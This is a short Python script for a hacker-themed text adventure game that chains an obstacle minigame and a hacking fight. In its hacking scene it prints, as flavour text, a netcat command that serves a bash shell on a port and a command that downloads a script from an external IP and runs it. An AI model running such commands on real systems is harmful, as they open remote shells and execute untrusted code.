import random as r
import os
from time import sleep
import hacking, obstacle
import animation as a

# intro text
input("There will be an interesting story here.")
# minigame 1 illogic puzzle

# minigame 2 obstacle course
start = input("Are ya ready?")
if start:
    pass
obstacle.game_loop(obstacle.main_animation)
start = input("Great job! We're in the server room now. Let's get Press anything to continue")
if start:
    pass

#minigame 3 hacking
a.animate_ascii(a.animation_frames)
print("nc -nvlp 1337 -e /bin/bash")
sleep(2.5)
print("/bin/sh$")
sleep(0.5)
print("/bin/sh$ cd /temp/ & wget http://135.xxx.xxx.xxx/omegaPwn.py -o omegaPwn.py & ./omegaPwn.py")
sleep(0.5)
print("You're in the mainframe. The elastic strap of your cyberViser is soaked through with inefficient human coolant.\n" \
"There's just one more layer of ICE to crack.\n" \
"Can you hack it, hacker?")
hacking.getFight(hacking.player, hacking.Enemy.virus)
nextMove = input("You lived. What next? (c)ontinue or (q)uit?")

# outro text / win

# lose function